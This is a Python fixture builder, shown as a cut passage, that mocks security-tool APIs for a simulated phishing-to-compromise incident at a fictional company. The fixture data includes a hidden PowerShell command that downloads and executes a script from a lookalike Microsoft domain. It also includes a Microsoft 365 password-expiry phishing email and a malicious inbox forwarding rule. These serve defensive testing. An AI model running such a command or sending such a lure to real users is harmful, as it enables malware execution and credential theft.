"""Fixture builders for the non-CrowdStrike connectors (same scenario as build_fixtures.py)."""

from __future__ import annotations

import base64

from build_fixtures import CVES, D, EXPOSURE, HOSTS, ORG, PAYLOAD_SHA, PHISH, TOR_IP, USERS, route, write


def u(k):
    return USERS[k]


# ----------------------------------------------------------------------------- Microsoft


def defender_endpoint() -> None:
    machines = [{"id": h["mde"], "computerDnsName": h["fqdn"], "aadDeviceId": h.get("aad"), "lastIpAddress": h["ip"],
                 "osPlatform": "Windows" if h["platform"] == "Windows" else "Linux", "osVersion": h["os"],
                 "riskScore": "High" if k == "jane" else "Low", "exposureLevel": "High" if k in {"web01", "db01"} else "Medium",
                 "healthStatus": "Active", "onboardingStatus": "Onboarded", "lastSeen": f"{D}10:00:00Z",
                 "machineTags": ["Finance"] if k == "jane" else []}
                for k, h in HOSTS.items() if "mde" in h]
    j = HOSTS["jane"]
    alerts = [
        {"id": "da-0001", "title": "Suspicious PowerShell command line", "severity": "High", "category": "Execution",
         "status": "New", "machineId": j["mde"], "computerDnsName": j["fqdn"], "alertCreationTime": f"{D}09:09:30Z",
         "mitreTechniques": ["T1059.001", "T1105"], "detectionSource": "WindowsDefenderAtp", "incidentId": 4401,
         "relatedUser": {"userName": "jane.doe", "domainName": "ACME"},
         "evidence": [{"entityType": "File", "sha256": PAYLOAD_SHA, "fileName": "invoice_viewer.ps1"},
                      {"entityType": "Url", "url": "https://login.micros0ft-helpdesk.com/p.ps1"}]},
        {"id": "da-0002", "title": "Exchange Server exploitation attempt blocked", "severity": "Medium",
         "category": "InitialAccess", "status": "New", "machineId": HOSTS["db01"]["mde"],
         "computerDnsName": HOSTS["db01"]["fqdn"], "alertCreationTime": f"{D}05:12:00Z", "mitreTechniques": ["T1190"],
         "detectionSource": "WindowsDefenderAv", "evidence": []},
    ]
    vulns = [{"id": f"{HOSTS[hk]['mde']}_{cve}", "machineId": HOSTS[hk]["mde"], "cveId": cve,
              "productName": " ".join(CVES[cve]["product"].split()[:-1]) or CVES[cve]["product"],
              "productVersion": CVES[cve]["product"].split()[-1], "severity": CVES[cve]["sev"],
              "fixingKbId": "KB5034765" if cve == "CVE-2024-21412" else None}
             for hk, cves in EXPOSURE.items() for cve in cves if "mde" in HOSTS[hk]]
    by_fqdn = lambda f: [m for m in machines if m["computerDnsName"] == f]  # noqa: E731
    write("defender_endpoint", [
        route("GET", r"^/api/machines$", {"value": by_fqdn(j["fqdn"])},
              params={"$filter": f"computerDnsName eq '{j['fqdn']}'"}),
        route("GET", r"^/api/machines$", {"value": by_fqdn(j["fqdn"])},
              params={"$filter": "startswith(computerDnsName,'jane-lt01')"}),
        route("GET", r"^/api/machines$", {"value": by_fqdn(HOSTS["bob"]["fqdn"])},
              params={"$filter": "startswith(computerDnsName,'bob-lt02')"}),
        route("GET", r"^/api/machines$", {"value": by_fqdn(HOSTS["web01"]["fqdn"])},
              params={"$filter": "startswith(computerDnsName,'web01')"}),
        route("GET", r"^/api/machines$", {"value": by_fqdn(HOSTS["db01"]["fqdn"])},
              params={"$filter": "startswith(computerDnsName,'db01')"}),
        route("GET", r"^/api/machines$", {"value": []}, params={"$filter": "*"}),
        route("GET", r"^/api/machines$", {"value": machines}),
        route("GET", r"^/api/machines/mde-jane01/alerts$", {"value": [alerts[0]]}),
        route("GET", r"^/api/machines/mde-db01/alerts$", {"value": [alerts[1]]}),
        route("GET", r"^/api/machines/[^/]+/alerts$", {"value": []}),
        route("GET", r"^/api/machines/findbyip$", {"value": by_fqdn(j["fqdn"])}, params={"ip": j["ip"], "timestamp": r"~^\d{4}-\d\d-\d\dT"}),
        route("GET", r"^/api/machines/findbyip$", {"value": []}),
        route("GET", r"^/api/alerts$", {"value": alerts}),
        route("GET", r"^/api/vulnerabilities/machinesVulnerabilities$", {"value": vulns}),
        route("GET", rf"^/api/files/{PAYLOAD_SHA}$", {"sha256": PAYLOAD_SHA, "globalPrevalence": 3,
                                                      "determinationType": "Malware", "signer": None}),
        route("GET", r"^/api/files/", {"globalPrevalence": 0, "determinationType": "Unknown"}),
        route("GET", r"^/api/domains/.+/stats$", {"orgPrevalence": 2}),
        route("GET", r"^/api/users/jane.doe/machines$", {"value": by_fqdn(j["fqdn"])}),
        route("GET", r"^/api/users/[^/]+/machines$", {"value": []}),
        route("POST", r"^/api/advancedqueries/run$", {"Results": [
            {"Timestamp": f"{D}09:07:41Z", "DeviceName": j["fqdn"], "ActionType": "ProcessCreated",
             "FileName": "powershell.exe", "ProcessCommandLine": "powershell.exe -nop -w hidden -c iex(iwr "
             "https://login.micros0ft-helpdesk.com/p.ps1)", "SHA256": PAYLOAD_SHA},
            {"Timestamp": f"{D}09:07:44Z", "DeviceName": j["fqdn"], "ActionType": "ConnectionSuccess",
             "RemoteUrl": "login.micros0ft-helpdesk.com"}]}, body_contains=["jane-lt01"]),
        route("POST", r"^/api/advancedqueries/run$", {"Results": []}),
        route("POST", r"^/api/indicators$", {"id": "ind-9001"}),
    ])


def defender_office365() -> None:
    mbox = f"soc-reports@{ORG}"
    events = [{"Timestamp": f"{D}09:02:0{i}Z", "NetworkMessageId": PHISH["nmid"], "InternetMessageId": PHISH["imid"],
               "SenderFromAddress": PHISH["sender"], "SenderMailFromAddress": PHISH["sender"],
               "SenderDisplayName": PHISH["display"], "SenderIPv4": PHISH["sender_ip"],
               "SenderFromDomain": PHISH["sender_domain"], "RecipientEmailAddress": u(r)["upn"],
               "Subject": PHISH["subject"], "DeliveryAction": "Delivered", "DeliveryLocation": "Inbox/folder",
               "LatestDeliveryAction": "", "ThreatTypes": "", "DetectionMethods": "", "UrlCount": 1, "AttachmentCount": 0,
               "AuthenticationDetails": '{"SPF":"pass","DKIM":"none","DMARC":"fail","CompAuth":"fail"}',
               "Url": PHISH["url"], "UrlDomain": PHISH["url_domain"], "SHA256": "", "FileName": ""}
              for i, r in enumerate(PHISH["recipients"])]
    variant = dict(events[0], NetworkMessageId="nm-7f3a-0002",
                   InternetMessageId="<20260920091500.2222@micros0ft-helpdesk.com>",
                   RecipientEmailAddress=u("priya")["upn"], Subject="Re: Action required: your password expires today",
                   Timestamp=f"{D}09:15:00Z", Url="https://login.micros0ft-helpdesk.com/verify?u=priya.nair")
    unrelated = dict(events[0], NetworkMessageId="nm-legit-0003", InternetMessageId="<newsletter@vendor.example>",
                     SenderFromAddress="news@vendor.example", SenderFromDomain="vendor.example",
                     SenderDisplayName="Vendor News", Subject="September product update", Url="https://vendor.example/news",
                     UrlDomain="vendor.example", RecipientEmailAddress=u("arun")["upn"], SenderIPv4="198.51.100.20",
                     AuthenticationDetails='{"SPF":"pass","DKIM":"pass","DMARC":"pass","CompAuth":"pass"}')
    clicks = [
        {"Timestamp": f"{D}09:05:10Z", "AccountUpn": u("jane")["upn"], "Url": PHISH["url"], "ActionType": "ClickAllowed",
         "IsClickedThrough": True, "NetworkMessageId": PHISH["nmid"], "IPAddress": HOSTS["jane"]["ip"], "Workload": "Email"},
        {"Timestamp": f"{D}09:11:02Z", "AccountUpn": u("priya")["upn"], "Url": PHISH["url"], "ActionType": "ClickBlocked",
         "IsClickedThrough": False, "NetworkMessageId": PHISH["nmid"], "IPAddress": "10.20.1.31", "Workload": "Email"},
    ]
    reported = {"id": "rep-msg-0001", "subject": f"Phishing report: {PHISH['subject']}",
                "from": {"emailAddress": {"address": u("bob")["upn"], "name": u("bob")["name"]}},
                "receivedDateTime": f"{D}09:20:00Z", "hasAttachments": True,
                "internetMessageId": f"<report-0001@{ORG}>"}
    mime = (f"Return-Path: <{PHISH['sender']}>\r\nReceived: from mail.micros0ft-helpdesk.com ({PHISH['sender_ip']}) by "
            f"mx.{ORG}; Sun, 20 Sep 2026 09:02:00 +0000\r\nAuthentication-Results: mx.{ORG}; spf=pass "
            "smtp.mailfrom=micros0ft-helpdesk.com; dkim=none; dmarc=fail header.from=micros0ft-helpdesk.com\r\n"
            f"From: \"{PHISH['display']}\" <{PHISH['sender']}>\r\nTo: {u('bob')['upn']}\r\nSubject: {PHISH['subject']}\r\n"
            f"Message-ID: {PHISH['imid']}\r\nDate: Sun, 20 Sep 2026 09:02:00 +0000\r\nMIME-Version: 1.0\r\n"
            "Content-Type: text/html; charset=utf-8\r\n\r\n"
            "<html><body><p>Dear user,</p><p>Your Microsoft 365 password <b>expires today</b>. To avoid losing access "
            "to your mailbox, verify your account immediately.</p>"
            f"<p><a href=\"{PHISH['url']}\">Keep my password</a></p><p>Microsoft 365 Support Team</p></body></html>\r\n")
    alert = {"id": "mdo-alert-0001", "title": "Email reported by user as malware or phish", "severity": "informational",
             "category": "InitialAccess", "status": "new", "createdDateTime": f"{D}09:20:05Z",
             "alertWebUrl": "https://security.microsoft.com/alerts/mdo-alert-0001", "incidentId": "4402",
             "evidence": [{"@odata.type": "#microsoft.graph.security.userEvidence",
                           "userAccount": {"userPrincipalName": u("bob")["upn"]}},
                          {"@odata.type": "#microsoft.graph.security.urlEvidence", "url": PHISH["url"]},
                          {"@odata.type": "#microsoft.graph.security.analyzedMessageEvidence",
                           "senderIp": PHISH["sender_ip"]}]}
    hunt = r"^/v1.0/security/runHuntingQuery$"
    write("defender_office365", [
        route("GET", rf"^/v1.0/users/{mbox}/mailFolders/inbox/messages$", {"value": [reported]}),
        route("GET", rf"^/v1.0/users/{mbox}/messages/rep-msg-0001/attachments$", {"value": [
            {"@odata.type": "#microsoft.graph.fileAttachment", "id": "att-1", "name": "original.eml",
             "contentType": "message/rfc822", "contentBytes": base64.b64encode(mime.encode()).decode()}]}),
        route("GET", r"^/v1.0/security/alerts_v2$", {"value": [alert]}),
        route("POST", hunt, {"results": clicks}, body_contains="UrlClickEvents | where Timestamp > ago(14d)"),
        route("POST", hunt, {"results": clicks[:1]}, body_contains=["UrlClickEvents", "jane.doe"]),
        route("POST", hunt, {"results": []}, body_contains="UrlClickEvents"),
        route("POST", hunt, {"results": events + [variant, unrelated]}, body_contains="let senders"),
        route("POST", hunt, {"results": [{"Timestamp": f"{D}09:30:00Z", "NetworkMessageId": PHISH["nmid"],
                                          "RecipientEmailAddress": u("raj")["upn"], "Action": "Moved to Junk",
                                          "ActionType": "ZAP", "ActionResult": "Success", "DeliveryLocation": "Junk"}]},
              body_contains="EmailPostDeliveryEvents"),
        route("POST", hunt, {"results": events}, body_contains=PHISH["nmid"]),
        route("POST", hunt, {"results": events}, body_contains=PHISH["imid"]),
        route("POST", hunt, {"results": [{"Messages": 9}]}, body_contains=["EmailUrlInfo", "micros0ft"]),
        route("POST", hunt, {"results": events[:1]}, body_contains=["EmailEvents", "jane.doe"]),
        route("POST", hunt, {"results": []}),
        route("POST", r"^/beta/security/collaboration/analyzedEmails/remediate$", {"id": "remediation-001",
                                                                                   "status": "running"}),
    ])


def entra() -> None:
    users = [{"id": x["id"], "userPrincipalName": x["upn"], "mail": x["upn"], "displayName": x["name"],
              "department": x["dept"], "jobTitle": x["title"], "accountEnabled": True,
              "onPremisesSamAccountName": x["upn"].split("@")[0], "createdDateTime": "2022-01-10T00:00:00Z"}
             for x in USERS.values()]
    j = u("jane")
    signins = [
        {"id": "si-001", "createdDateTime": f"{D}08:30:00Z", "userPrincipalName": j["upn"], "userId": j["id"],
         "appDisplayName": "Office 365 Exchange Online", "ipAddress": "203.0.113.10", "clientAppUsed": "Browser",
         "status": {"errorCode": 0}, "location": {"city": "Kolkata", "countryOrRegion": "IN"},
         "riskLevelDuringSignIn": "none", "riskState": "none", "conditionalAccessStatus": "success",
         "deviceDetail": {"deviceId": HOSTS["jane"]["aad"], "displayName": "JANE-LT01", "isCompliant": True},
         "authenticationRequirement": "multiFactorAuthentication"},
        {"id": "si-002", "createdDateTime": f"{D}09:15:40Z", "userPrincipalName": j["upn"], "userId": j["id"],
         "appDisplayName": "Office 365 Exchange Online", "ipAddress": TOR_IP, "clientAppUsed": "Browser",
         "status": {"errorCode": 0}, "location": {"city": "Frankfurt", "countryOrRegion": "DE"},
         "riskLevelDuringSignIn": "high", "riskState": "atRisk", "conditionalAccessStatus": "success",
         "mfaDetail": {"authMethod": "Microsoft Authenticator app", "authDetail": "MFA completed (push approved)"},
         "deviceDetail": {"deviceId": "", "displayName": "", "isCompliant": False},
         "authenticationRequirement": "multiFactorAuthentication"},
    ]
    detections = [{"id": "rd-001", "userPrincipalName": j["upn"], "userId": j["id"], "riskEventType": "anonymizedIPAddress",
                   "riskLevel": "high", "ipAddress": TOR_IP, "detectedDateTime": f"{D}09:15:41Z",
                   "detectionTimingType": "realtime", "location": {"city": "Frankfurt", "countryOrRegion": "DE"}}]
    risky = [{"id": j["id"], "userPrincipalName": j["upn"], "riskLevel": "high", "riskState": "atRisk",
              "riskDetail": "none", "riskLastUpdatedDateTime": f"{D}09:15:41Z"}]
    rules = [{"id": "rule-1", "displayName": "..", "sequence": 1, "isEnabled": True,
              "conditions": {"subjectContains": ["invoice", "payment"]},
              "actions": {"forwardTo": [{"emailAddress": {"address": "archive.box@protonmail.example"}}],
                          "moveToFolder": "RSS Feeds"}}]
    audits = [{"id": "da-001", "activityDateTime": f"{D}09:18:02Z", "activityDisplayName": "Set-InboxRule",
               "category": "UserManagement", "result": "success",
               "initiatedBy": {"user": {"userPrincipalName": j["upn"], "id": j["id"]}},
               "targetResources": [{"type": "User", "userPrincipalName": j["upn"]}]}]
    routes = [
        route("GET", r"^/v1.0/users$", {"value": users}),
        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": signins}, params={"$filter": f"~userPrincipalName eq '{j['upn']}'"}),
        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": [signins[1]]}, params={"$filter": f"ipAddress eq '{TOR_IP}'"}),
        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": []}, params={"$filter": "*"}),
        route("GET", r"^/v1.0/auditLogs/signIns$", {"value": signins}),
        route("GET", r"^/v1.0/identityProtection/riskyUsers$", {"value": risky},
              params={"$filter": f"userPrincipalName eq '{j['upn']}'"}),
        route("GET", r"^/v1.0/identityProtection/riskyUsers$", {"value": []}, params={"$filter": "*"}),
        route("GET", r"^/v1.0/identityProtection/riskyUsers$", {"value": risky}),
        route("GET", r"^/v1.0/identityProtection/riskDetections$", {"value": detections}),
        route("GET", r"^/v1.0/auditLogs/directoryAudits$", {"value": audits}),
    ]
    for k, x in USERS.items():
        member = [{"@odata.type": "#microsoft.graph.group", "displayName": f"{x['dept']} Team"}]
        if k == "bob":
            member.append({"@odata.type": "#microsoft.graph.directoryRole", "displayName": "Exchange Administrator"})
        if k == "raj":
            member.append({"@odata.type": "#microsoft.graph.group", "displayName": "VIP-Executives"})
        devices = ([{"id": "dev-1", "displayName": "JANE-LT01", "registrationDateTime": "2025-02-01T00:00:00Z"},
                    {"id": "dev-2", "displayName": "DESKTOP-7H2K9Q", "registrationDateTime": f"{D}09:17:00Z"}]
                   if k == "jane" else [])
        routes += [
            route("GET", rf"^/v1.0/users/{x['upn']}$", next(v for v in users if v["userPrincipalName"] == x["upn"])),
            route("GET", rf"^/v1.0/users/{x['upn']}/transitiveMemberOf$", {"value": member}),
            route("GET", rf"^/v1.0/users/{x['upn']}/authentication/methods$", {"value": [
                {"@odata.type": "#microsoft.graph.passwordAuthenticationMethod"},
                {"@odata.type": "#microsoft.graph.microsoftAuthenticatorAuthenticationMethod"}]}),
            route("GET", rf"^/v1.0/users/{x['upn']}/mailFolders/inbox/messageRules$", {"value": rules if k == "jane" else []}),
            route("GET", rf"^/v1.0/users/{x['upn']}/registeredDevices$", {"value": devices}),
        ]
    write("entra", routes)


# ----------------------------------------------------------------------------- exposure tools


def rapid7() -> None:
    order = ("web01", "db01", "fs01", "jane")
    assets = []
    for k in order:
        h = HOSTS[k]
        cves = EXPOSURE.get(k, [])
        assets.append({"id": h.get("r7", 110), "hostName": h["fqdn"], "ip": h["ip"], "os": h["os"],
                       "riskScore": 25000.0 if cves else 120.0,
                       "addresses": [{"ip": h["ip"], "mac": h["mac"]}] if h.get("mac") else [{"ip": h["ip"]}],
                       "vulnerabilities": {"total": len(cves), "critical": sum(CVES[c]["cvss"] >= 9 for c in cves)},
                       "history": [{"date": f"{D}03:00:00Z"}], "tags": [{"name": "Production"}] if k != "jane" else []})
    routes = [route("GET", r"^/api/3/assets$", {"resources": assets, "page": {"number": 0, "size": 500, "totalPages": 1,
                                                                               "totalResources": len(assets)}})]
    for a, k in zip(assets, order):
        findings = [{"id": f"r7-{c.lower()}", "status": "vulnerable", "since": "2026-08-15T00:00:00Z"}
                    for c in EXPOSURE.get(k, []) if not (k == "web01" and c == "CVE-2023-44487")]  # coverage gap
        routes.append(route("GET", rf"^/api/3/assets/{a['id']}/vulnerabilities$", {"resources": findings}))
        routes.append(route("GET", rf"^/api/3/assets/{a['id']}$", a))
    for c, meta in CVES.items():
        routes.append(route("GET", rf"^/api/3/vulnerabilities/r7-{c.lower()}$", {
            "id": f"r7-{c.lower()}", "title": meta["desc"], "cves": [c], "cvss": {"v3": {"score": meta["cvss"]}},
            "severity": meta["sev"], "exploits": 2 if meta["kev"] else 0,
            "malwareKits": 1 if c == "CVE-2021-44228" else 0, "solution": {"summary": f"Upgrade {meta['product']}"}}))
    routes += [
    ]
    for c in CVES:  # asset search with the "cve" filter -> assets where Rapid7 reports that CVE
        hit = [a for a, k in zip(assets, order) if c in EXPOSURE.get(k, []) and not (k == "web01" and c == "CVE-2023-44487")]
        routes.append(route("POST", r"^/api/3/assets/search$", {"resources": hit}, body_contains=['"cve"', c]))
    routes += [
        route("POST", r"^/api/3/assets/search$", {"resources": []}, body_contains='"cve"'),
        route("POST", r"^/api/3/assets/search$", {"resources": [assets[0]]}, body_contains="web01"),
        route("POST", r"^/api/3/assets/search$", {"resources": [assets[1]]}, body_contains="db01"),
        route("POST", r"^/api/3/assets/search$", {"resources": [assets[3]]}, body_contains="jane"),
        route("POST", r"^/api/3/assets/search$", {"resources": []}),
    ]
    write("rapid7", routes)


def wiz() -> None:
    w = HOSTS["web01"]
    resources = [{"id": w["wiz"], "name": "web01", "type": "VIRTUAL_MACHINE", "externalId": w["cloud"],
                  "providerUniqueId": w["cloud"], "region": "centralindia", "subscriptionExternalId": "sub-001",
                  "updatedAt": f"{D}04:00:00Z", "graphEntity": {"properties": {"hostname": "web01", "privateIpAddresses": [w["ip"]],
                                                 "operatingSystem": "Linux", "hasWideInternetExposure": True}}}]
    vulns = [{"id": f"wiz-vf-{c.lower()}", "name": c, "CVSSSeverity": CVES[c]["sev"].upper(), "score": CVES[c]["cvss"],
              "exploitabilityScore": 3.9, "hasExploit": CVES[c]["kev"], "hasCisaKevExploit": CVES[c]["kev"],
              "status": "OPEN", "firstDetectedAt": "2026-08-20T00:00:00Z", "lastDetectedAt": f"{D}04:00:00Z",
              "fixedVersion": "2.17.1" if c == "CVE-2021-44228" else None, "detailedName": CVES[c]["product"].split()[0],
              "version": CVES[c]["product"].split()[-1], "remediation": f"Upgrade {CVES[c]['product']}",
              "portalUrl": f"https://app.wiz.io/vulnerability-findings#{c}",
              "vulnerableAsset": {"id": w["wiz"], "name": "web01", "type": "VIRTUAL_MACHINE",
                                  "providerUniqueId": w["cloud"], "ipAddresses": [w["ip"]], "operatingSystem": "Linux",
                                  "hasWideInternetExposure": True}} for c in EXPOSURE["web01"]]
    issues = [{"id": "wiz-issue-001", "severity": "HIGH", "status": "OPEN", "createdAt": "2026-09-18T00:00:00Z",
               "type": "TOXIC_COMBINATION",
               "sourceRule": {"name": "Publicly exposed VM with critical vulnerability and high-privileged identity"},
               "entitySnapshot": {"id": w["wiz"], "name": "web01", "type": "VIRTUAL_MACHINE", "providerId": w["cloud"],
                                  "region": "centralindia", "cloudPlatform": "Azure", "subscriptionExternalId": "sub-001"}},
              {"id": "wiz-issue-002", "severity": "MEDIUM", "status": "OPEN", "createdAt": "2026-09-10T00:00:00Z",
               "type": "CLOUD_CONFIGURATION", "sourceRule": {"name": "Storage account allows public blob access"},
               "entitySnapshot": {"id": "wiz-sa-backups", "name": "acmebackups", "type": "BUCKET",
                                  "providerId": "/subscriptions/sub-001/resourceGroups/prod/providers/Microsoft.Storage/"
                                                "storageAccounts/acmebackups", "region": "centralindia",
                                  "cloudPlatform": "Azure", "subscriptionExternalId": "sub-001"}}]
    pi = {"hasNextPage": False, "endCursor": "c1"}
    write("wiz", [
        route("POST", r"^/graphql$", {"data": {"cloudResources": {"nodes": resources, "pageInfo": pi, "totalCount": 1}}},
              body_contains="cloudResources"),
        *[route("POST", r"^/graphql$", {"data": {"vulnerabilityFindings": {
            "nodes": [v for v in vulns if v["name"] == c], "pageInfo": pi}}}, body_contains=["vulnerabilityExternalId", f'"{c}"'])
          for c in CVES],
        route("POST", r"^/graphql$", {"data": {"vulnerabilityFindings": {"nodes": [], "pageInfo": pi}}},
              body_contains="vulnerabilityExternalId"),
        route("POST", r"^/graphql$", {"data": {"vulnerabilityFindings": {"nodes": vulns, "pageInfo": pi}}},
              body_contains="vulnerabilityFindings"),
        route("POST", r"^/graphql$", {"data": {"issuesV2": {"nodes": issues, "pageInfo": pi}}}, body_contains="issuesV2("),
    ])


# ----------------------------------------------------------------------------- DNS, deception, PAM, email gateway


def umbrella() -> None:
    def row(t, host, user, ip, domain, verdict, cats):
        return {"timestamp": f"{D}{t}Z", "domain": domain, "verdict": verdict, "internalip": ip,
                "externalip": "203.0.113.10", "querytype": "A", "categories": cats,
                "identities": [{"label": host, "type": {"type": "roaming"}},
                               {"label": user, "type": {"type": "directory_user"}}]}
    phish_cat = [{"label": "Phishing", "type": "security"}]
    data = [row("09:05:12", "JANE-LT01", u("jane")["upn"], HOSTS["jane"]["ip"], PHISH["url_domain"], "allowed", phish_cat),
            row("09:07:40", "JANE-LT01", u("jane")["upn"], HOSTS["jane"]["ip"], PHISH["url_domain"], "allowed", phish_cat),
            row("09:11:03", "PRIYA-LT07", u("priya")["upn"], "10.20.1.31", PHISH["url_domain"], "blocked", phish_cat),
            row("09:30:00", "JANE-LT01", u("jane")["upn"], HOSTS["jane"]["ip"], "outlook.office365.com", "allowed",
                [{"label": "Business Services", "type": "content"}])]
    fs, ai, vpn = ([{"label": "File Storage", "type": "content"}], [{"label": "Generative AI", "type": "application"}],
                   [{"label": "Personal VPN", "type": "content"}, {"label": "Proxy/Anonymizer", "type": "content"}])
    shadow = [("10:02:11", "ARUN-LT05", u("arun")["upn"], "10.20.1.41", "wetransfer.com", "allowed", fs),
              ("10:04:37", "ARUN-LT05", u("arun")["upn"], "10.20.1.41", "wetransfer.com", "allowed", fs),
              ("11:15:02", "MEERA-LT06", u("meera")["upn"], "10.20.1.44", "wetransfer.com", "allowed", fs),
              ("10:30:00", "LI-DEV08", u("li")["upn"], "10.20.1.52", "chat.deepseek.com", "allowed", ai),
              ("10:31:12", "LI-DEV08", u("li")["upn"], "10.20.1.52", "chat.deepseek.com", "allowed", ai),
              ("12:01:40", "TOM-LT07", u("tom")["upn"], "10.20.1.47", "chat.deepseek.com", "allowed", ai),
              ("13:20:05", "LI-DEV08", u("li")["upn"], "10.20.1.52", "nordvpn.com", "blocked", vpn),
              ("13:21:44", "LI-DEV08", u("li")["upn"], "10.20.1.52", "mega.nz", "blocked", fs),
              ("14:05:09", "MEERA-LT06", u("meera")["upn"], "10.20.1.44", "anydesk.com", "allowed",
               [{"label": "Remote Access", "type": "content"}]),
              ("14:40:31", "TOM-LT07", u("tom")["upn"], "10.20.1.47", "teams.microsoft.com", "allowed",
               [{"label": "Business Services", "type": "content"}]),
              ("15:02:18", "ARUN-LT05", u("arun")["upn"], "10.20.1.41", "update-flash-player.xyz", "blocked",
               [{"label": "Malware", "type": "security"}, {"label": "Newly Seen Domains", "type": "security"}])]
    data += [row(*r) for r in shadow]
    phish_rows = [d for d in data if d["domain"] == PHISH["url_domain"]]
    write("umbrella", [
        route("GET", r"^/reports/v2/activity/dns$", {"data": phish_rows}, params={"domains": PHISH["url_domain"]}),
        route("GET", r"^/reports/v2/activity/dns$", {"data": phish_rows}, params={"domains": PHISH["sender_domain"]}),
        route("GET", r"^/reports/v2/activity/dns$", {"data": []}, params={"domains": "*"}),
        route("GET", r"^/reports/v2/activity/dns$", {"data": [d for d in data if d["internalip"] == HOSTS["jane"]["ip"]]},
              params={"ip": HOSTS["jane"]["ip"]}),
        route("GET", r"^/reports/v2/activity/dns$", {"data": []}, params={"ip": "*"}),
        route("GET", r"^/reports/v2/activity/dns$", {"data": data}),
        route("GET", r"^/policies/v2/destinationlists/[^/]+/destinations$", {"data": [
            {"id": "d-1", "destination": PHISH["url_domain"]}]}),
    ])


def canary() -> None:
    inc = {"id": "canary-inc-0001", "description": {
        "incident_id": "canary-inc-0001", "description": "Shared File Opened", "name": "FS01-Finance-Backups",
        "node_id": "canary-node-fs01", "src_host": HOSTS["jane"]["ip"], "src_host_reverse": HOSTS["jane"]["fqdn"],
        "dst_host": "10.10.0.21", "dst_port": "445", "created_std": f"{D}09:40:11Z", "acknowledged": "False",
        "logtype": "5000", "events_count": "3",
        "logdata": [{"USERNAME": "jane.doe", "FILENAME": "\\\\Finance-Backups\\2026-Q3-payroll.xlsx"}]}}
    write("canary", [
        route("GET", r"^/api/v1/incidents/all$", {"incidents": [inc], "max_updated_id": 1001}),
        route("GET", r"^/api/v1/devices/all$", {"devices": [{"id": "canary-node-fs01", "name": "FS01-Finance-Backups",
                                                               "ip_address": "10.10.0.21", "location": "DC1"}]}),
    ])


def delinea_secret_server() -> None:
    recs = [{"secretAuditId": 7001, "secretId": 42, "secretName": "SAP-Prod-Finance-Service", "action": "VIEW",
             "byUserName": "ACME\\jane.doe", "dateRecorded": f"{D}09:45:30Z", "ipAddress": HOSTS["jane"]["ip"],
             "machineName": "JANE-LT01", "folderPath": "\\Finance\\Production"},
            {"secretAuditId": 7002, "secretId": 42, "secretName": "SAP-Prod-Finance-Service", "action": "COPY PASSWORD",
             "byUserName": "ACME\\jane.doe", "dateRecorded": f"{D}09:45:52Z", "ipAddress": HOSTS["jane"]["ip"],
             "machineName": "JANE-LT01", "folderPath": "\\Finance\\Production"},
            {"secretAuditId": 7003, "secretId": 17, "secretName": "Exchange-Admin", "action": "LAUNCH",
             "byUserName": "ACME\\bob.lee", "dateRecorded": f"{D}08:00:00Z", "ipAddress": HOSTS["bob"]["ip"],
             "machineName": "BOB-LT02", "folderPath": "\\IT"}]
    write("delinea_secret_server", [
        route("GET", r"^/api/v1/secret-audits$", {"records": recs[:2]}, params={"filter.userName": "jane.doe"}),
        route("GET", r"^/api/v1/secret-audits$", {"records": [recs[2]]}, params={"filter.userName": "bob.lee"}),
        route("GET", r"^/api/v1/secret-audits$", {"records": []}, params={"filter.userName": "*"}),
        route("GET", r"^/api/v1/secret-audits$", {"records": recs, "total": 3, "hasNext": False}),
        route("GET", r"^/api/v1/launched-sessions$", {"records": []}),
        route("GET", r"^/api/v1/users$", {"records": [{"userName": "jane.doe", "isApplicationAccount": False,
                                                       "adminRoles": []}]}),
    ])


def delinea_privilege_manager() -> None:
    ev = [{"id": 501, "eventTime": f"{D}09:08:00Z", "userName": "ACME\\jane.doe", "computerName": "JANE-LT01",
           "applicationName": "powershell.exe", "outcome": "Denied", "policyName": "Block unsigned admin tools",
           "fileHash": PAYLOAD_SHA}]
    write("delinea_privilege_manager", [
        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": ev}, params={"userName": "jane.doe"}),
        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": ev}, params={"computerName": "JANE-LT01"}),
        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": []}, params={"userName": "*"}),
        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": []}, params={"computerName": "*"}),
        route("GET", r"^/Tms/api/v1/events/elevation$", {"items": ev, "hasMore": False, "lastId": 501}),
    ])


def avanan() -> None:
    write("avanan", [
        route("POST", r"^/app/hec-api/v1.0/search/query$", {"responseData": [{
            "entityInfo": {"entityId": "av-ent-0001"},
            "entitySecurityResult": {"combinedVerdict": "clean", "antiphishing": {"verdict": "clean"},
                                     "anti_malware": {"verdict": "clean"}, "clicktimeProtection": {"verdict": "clean"}},
            "entityActions": []}]}, body_contains=PHISH["imid"]),
        route("POST", r"^/app/hec-api/v1.0/search/query$", {"responseData": []}),
        route("POST", r"^/app/hec-api/v1.0/event/query$", {"responseData": [{
            "eventId": "av-evt-001", "type": "spam", "state": "detected", "severity": "low",
            "eventCreated": f"{D}06:00:00Z", "description": "Spam campaign from vendor.example",
            "senderAddress": "news@vendor.example", "recipients": [u("arun")["upn"]], "actions": [{"actionType": "tag"}],
            "entityId": "av-ent-0009"}]}),
    ])


# ----------------------------------------------------------------------------- intel, ITSM, CMDB, SIEM


def nvd() -> None:
    routes = []
    for c, m in CVES.items():
        routes.append(route("GET", r"^/rest/json/cves/2.0$", {"totalResults": 1, "vulnerabilities": [{"cve": {
            "id": c, "published": "2023-01-01T00:00:00", "lastModified": "2026-01-01T00:00:00",
            "descriptions": [{"lang": "en", "value": m["desc"]}],
            "metrics": {"cvssMetricV31": [{"cvssData": {"baseScore": m["cvss"], "baseSeverity": m["sev"].upper(),
                                                        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"}}]},
            "weaknesses": [{"description": [{"value": "CWE-502"}]}],
            "references": [{"url": f"https://example.org/advisory/{c}", "tags": ["Vendor Advisory"]},
                           {"url": f"https://example.org/poc/{c}", "tags": ["Exploit"]}]}}]}, params={"cveId": c}))
    routes.append(route("GET", r"^/rest/json/cves/2.0$", {"totalResults": 0, "vulnerabilities": []}))
    write("nvd", routes)


def epss() -> None:
    rows = [{"cve": c, "epss": str(m["epss"]), "percentile": str(round(min(0.9999, 0.5 + m["epss"] / 2), 4)),
             "date": "2026-09-20"} for c, m in CVES.items()]
    write("epss", [route("GET", r"^/data/v1/epss$", {"data": rows},
